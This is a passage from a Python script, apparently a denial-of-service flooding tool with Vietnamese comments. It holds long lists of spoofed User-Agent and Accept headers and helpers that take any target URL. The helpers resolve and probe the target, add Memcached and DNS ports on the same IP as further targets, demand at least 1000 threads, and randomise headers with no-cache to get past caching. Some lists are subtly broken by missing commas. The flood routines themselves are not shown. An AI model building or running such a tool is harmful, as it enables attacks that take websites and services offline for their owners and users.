    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.1 (KHTML, like Gecko) Safari/312",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.20",
    "Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.7 (KHTML, like Gecko) Safari/125.12",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/18.0.1025.168 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/85.8.5 (KHTML, like Gecko) Safari/85.8",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.22 (KHTML, like Gecko) Safari/83.22",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.19 (KHTML, like Gecko) Safari/83.19",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.18 (KHTML, like Gecko) Safari/83.18",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.17 (KHTML, like Gecko) Safari/83.17",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:71.0) Gecko/20100101 Firefox/71.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.16 (KHTML, like Gecko) Safari/83.16",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/5.0.355.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.15 (KHTML, like Gecko) Safari/83.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/4.0.305.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/3.0.195.38 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/2.0.171.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.14 (KHTML, like Gecko) Safari/83.14",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.13 (KHTML, like Gecko) Safari/83.13",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.12.1537.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.11.1502.0 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.12 (KHTML, like Gecko) Safari/83.12",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.10.1488.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.11 (KHTML, like Gecko) Safari/83.11",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.9.1474.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.8.1467.0 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.7.1453.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.10 (KHTML, like Gecko) Safari/83.10",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.6.1410.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.9 (KHTML, like Gecko) Safari/83.9",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.5.1383.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.4.1365.0 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.8 (KHTML, like Gecko) Safari/83.8",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.3.1350.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.7 (KHTML, like Gecko) Safari/83.7",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.2.1337.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.1.1326.0 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.6 (KHTML, like Gecko) Safari/83.6",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 1_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A110a Safari/419.3",
    "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.5 (KHTML, like Gecko) Safari/83.5",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/83.4 (KHTML, like Gecko) Safari/83.4",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/0.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)",
    "Mozilla/5.0 (compatible; Sogou web spider/4.0; +http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
    "Mozilla/5.0 (compatible; SeznamBot/4.0; +http://napoveda.seznam.cz/seznambot-intro/)",
    "Mozilla/5.0 (compatible; DotBot/1.2; +http://www.opensiteexplorer.org/dotbot)",
    "Mozilla/5.0 (compatible; CCBot/2.0; +http://commoncrawl.org/faq/)",
    "Mozilla/5.0 (compatible; PetalBot; +https://webmaster.petalsearch.com/site/petalbot)",
    "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)",
    "Mozilla/5.0 (compatible; ArchiveBot/1.0; +http://archive.org/details/archivebot)",
    "Mozilla/5.0 (compatible; ZoomBot/1.0; +http://zoominf.com/robot)",
    "Mozilla/5.0 (compatible; LinkpadBot/1.0; +http://www.linkpad.ru/)",
    "Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)"
]

# Danh sách accept headers
ACCEPT_HEADERS = [
    "text/html", "application/json", "application/xml", "*/*", "image/webp"
    "text/html",
    "application/json",
    "image/png",
    "text/plain",
    "application/xml",
    "*/*",
    "text/html,application/xhtml+xml",
    "application/json;q=0.9",
    "image/jpeg",
    "audio/mpeg",
    "video/mp4",
    "text/css",
    "application/javascript",
    "image/gif",
    "multipart/form-data",
    "application/pdf",
    "text/html;q=0.8",
    "application/json,application/xml",
    "image/webp",
    "audio/wav",
    "video/webm",
    "text/xml",
    "application/x-www-form-urlencoded",
    "image/svg+xml",
    "application/rss+xml",
    "text/html,application/json;q=0.9",
    "image/png,image/jpeg;q=0.8",
    "audio/ogg",
    "video/mpeg",
    "text/plain,application/json",
    "application/xml;q=0.7",
    "image/bmp",
    "multipart/mixed",
    "application/atom+xml",
    "text/html,*/*;q=0.8",
    "application/json;q=0.8,text/plain;q=0.6",
    "image/tiff",
    "audio/aac",
    "video/ogg",
    "text/csv",
    "application/octet-stream",
    "image/x-icon",
    "multipart/related",
    "application/ld+json",
    "text/html,application/xml;q=0.9",
    "application/json,*/*;q=0.5",
    "image/apng",
    "audio/flac",
    "video/avi",
    "text/markdown",
    "application/soap+xml",
    "image/heic",
    "multipart/byteranges",
    "application/graphql",
    "text/html,application/json;q=0.8,*/*;q=0.6",
    "image/jpeg,image/png;q=0.9",
    "audio/midi",
    "video/quicktime",
    "text/javascript",
    "application/x-yaml",
    "image/avif",
    "multipart/alternative",
    "application/hal+json",
    "text/html;q=0.9,application/json;q=0.7",
    "application/xml,text/plain;q=0.8",
    "image/jpg",
    "audio/amr",
    "video/3gpp",
    "text/rtf",
    "application/x-tar",
    "image/tga",
    "multipart/signed",
    "application/sparql-query",
    "text/html,application/xhtml+xml;q=0.9",
    "application/json;q=0.7,*/*;q=0.5",
    "image/x-png",
    "audio/x-wav",
    "video/x-ms-wmv",
    "text/x-yaml",
    "application/x-zip-compressed",
    "image/x-ms-bmp",
    "multipart/encrypted",
    "application/x-ndjson",
    "text/html,*/*;q=0.7,application/json;q=0.6",
    "image/png;q=0.9,image/jpeg;q=0.8",
    "audio/x-mpeg",
    "video/x-flv",
    "text/x-markdown",
    "application/x-rar-compressed",
    "image/x-tiff",
    "multipart/digest",
    "application/x-opc+zip",
    "text/html,application/xml;q=0.8,*/*;q=0.5",
    "application/json;q=0.9,text/html;q=0.7",
    "image/x-webp",
    "audio/x-aiff",
    "video/x-matroska",
    "text/x-c",
    "application/x-bzip2",
    "image/x-gif",
    "multipart/report",
    "application/x-msdownload",
    "text/html,application/json;q=0.8",
    "image/jpeg;q=0.9,*/*;q=0.6",
    "audio/x-m4a",
    "video/x-ms-asf",
    "text/x-python",
    "application/x-gzip",
    "image/x-jpeg",
    "multipart/x-mixed-replace",
    "application/x-msi",
    "text/html,*/*;q=0.9",
    "application/json,application/xml;q=0.8",
    "image/x-bmp",
    "audio/x-ms-wma",
    "video/x-msvideo",
    "text/x-java-source",
    "application/x-7z-compressed",
    "image/x-svg",
    "multipart/form-data;q=0.8",
    "application/x-shockwave-flash",
    "text/html,application/xhtml+xml;q=0.8,*/*;q=0.6",
    "application/json;q=0.8,*/*;q=0.7",
    "image/x-jpg",
    "audio/x-vorbis",
    "video/x-ogm",
    "text/x-latex",
    "application/x-tgz",
    "image/x-pcx",
    "multipart/parallel",
    "application/x-exe",
    "text/html,application/json;q=0.9,*/*;q=0.7",
    "image/png,image/jpeg;q=0.9,*/*;q=0.5",
    "audio/x-flac",
    "video/x-m4v",
    "text/x-asm",
    "application/x-deb",
    "image/x-heic",
    "multipart/mixed;q=0.9",
    "application/x-csh",
    "text/html,application/xml;q=0.9,*/*;q=0.8",
    "application/json;q=0.7,text/plain;q=0.5",
    "image/x-avif",
    "audio/x-opus",
    "video/x-mpeg",
    "text/x-pascal",
    "application/x-arj",
    "image/x-jp2",
    "multipart/related;q=0.8",
    "application/x-perl",
    "text/html,*/*;q=0.8,application/json;q=0.5",
    "image/jpeg;q=0.8,image/png;q=0.7",
    "audio/x-aac",
    "video/x-vp8",
    "text/x-typescript",
    "application/x-lzh",
    "image/x-xbitmap",
    "multipart/signed;q=0.9",
    "application/x-python",
    "text/html,application/xhtml+xml;q=0.7,*/*;q=0.5",
    "application/json;q=0.9,application/xml;q=0.6",
    "image/x-tga",
    "audio/x-midi",
    "video/x-vp9",
    "text/x-go",
    "application/x-lzip",
    "image/x-xpm",
    "multipart/encrypted;q=0.8",
    "application/x-sh",
    "text/html,application/json;q=0.7,*/*;q=0.8",
    "image/png;q=0.8,*/*;q=0.6",
    "audio/x-amr",
    "video/x-3gp",
    "text/x-perl",
    "application/x-zip",
    "image/x-xcf",
    "multipart/digest;q=0.9",
    "application/x-tcl",
    "text/html,*/*;q=0.7,application/xml;q=0.6",
    "application/json;q=0.8,text/html;q=0.5",
    "image/x-jpeg2000",
    "audio/x-wma",
    "video/x-divx",
    "text/x-ruby",
    "application/x-ace",
    "image/x-pict",
    "multipart/report;q=0.8",
    "application/x-vbscript",
    "text/html,application/json;q=0.6,*/*;q=0.5",
    "image/jpeg,image/png;q=0.8,*/*;q=0.7",
    "audio/x-mpegurl",
    "video/x-mkv",
    "text/x-scala",
    "application/x-lha",
    "image/x-raw",
    "multipart/x-mixed-replace;q=0.9",
    "application/x-awk"
    ]


# ------------------------------
# Các hàm hỗ trợ
# ------------------------------
stats = defaultdict(int)
stats_lock = threading.Lock()

def is_valid_url(url):
    """Xác thực cấu trúc URL."""
    try:
        result = urlparse(url)
        return all([result.scheme in ["http", "https"], result.netloc])
    except ValueError:
        return False

def resolve_ip(host):
    """Phân giải IP từ hostname."""
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        logging.error(f"Failed to resolve IP for {host}")
        return None

def is_valid_threads(num_threads):
    """Xác thực số luồng phải >= 1000."""
    try:
        return int(num_threads) >= 1000
    except ValueError:
        return False

def check_server(ip, port, timeout=5):
    """Kiểm tra kết nối TCP tới máy chủ."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            return True
    except Exception as e:
        logging.error(f"Server check failed for {ip}:{port}: {e}")
        return False

def input_targets():
    """Nhập cấu hình mục tiêu và tự động thêm mục tiêu Memcached, DNS."""
    targets = {
        "web_targets": [],
        "memcached_targets": [],
        "dns_targets": []
    }
    while True:
        url = input("Nhập URL mục tiêu web (http:// hoặc https://): ").strip()
        if not is_valid_url(url):
            print("URL không hợp lệ, thử lại.")
            continue
        parsed = urlparse(url)
        host = parsed.hostname
        ip = resolve_ip(host)
        if not ip:
            print(f"Không thể phân giải IP từ {host}, thử lại.")
            continue
        port = 443 if parsed.scheme == "https" else 80
        if not check_server(ip, port):
            print(f"Không thể kết nối đến {ip}:{port}. Đảm bảo máy chủ đang hoạt động.")
            continue
        targets["web_targets"].append({"url": url, "ip": ip, "port": port})
        print(f"Đã nhận diện: URL={url}, IP={ip}, Port={port}")
        break
    # Tạo mục tiêu Memcached và DNS dựa trên IP web
    ip = targets["web_targets"][0]["ip"]
    targets["memcached_targets"].append({"ip": ip, "port": 11211})
    targets["dns_targets"].append({"ip": ip, "port": 53})
    print(f"Đã tự động thêm: Memcached IP={ip}, Port=11211; DNS IP={ip}, Port=53")
    return targets

def generate_headers():
    """Sinh tiêu đề HTTP ngẫu nhiên."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Cache-Control": "no-cache",
        "Content-Type": random.choice([
            "application/x-www-form-urlencoded",
            "application/json",
            "text/xml"
        ]),
        "Connection": "keep-alive"
    }

def random_string(length):
    """Sinh chuỗi ngẫu nhiên gồm chữ và số."""
